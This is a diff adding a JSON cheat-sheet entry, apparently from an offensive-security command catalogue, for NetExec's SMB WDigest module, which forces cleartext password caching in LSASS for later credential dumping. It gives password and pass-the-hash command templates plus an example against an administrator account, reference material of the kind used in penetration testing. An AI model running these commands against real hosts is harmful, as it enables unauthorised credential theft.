@@ -1,0 +1,36 @@
+{
+  "id": "nxc-smb-wdigest",
+  "name": "NetExec SMB WDigest Enable",
+  "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M wdigest -o ACTION=enable",
+  "description": "Enable or disable WDigest authentication to force cleartext password caching in LSASS",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tags": [
+    "nxc",
+    "smb",
+    "wdigest",
+    "cleartext",
+    "lsass",
+    "credential-dumping"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M wdigest -o ACTION=enable"
+    },
+    {
+      "label": "Disable WDigest",
+      "requires": "password",
+      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M wdigest -o ACTION=disable"
+    }
+  ],
+  "examples": [
+    "nxc smb '192.168.1.100' -u 'administrator' -p 'password' -M wdigest -o ACTION=enable"
+  ]
+}
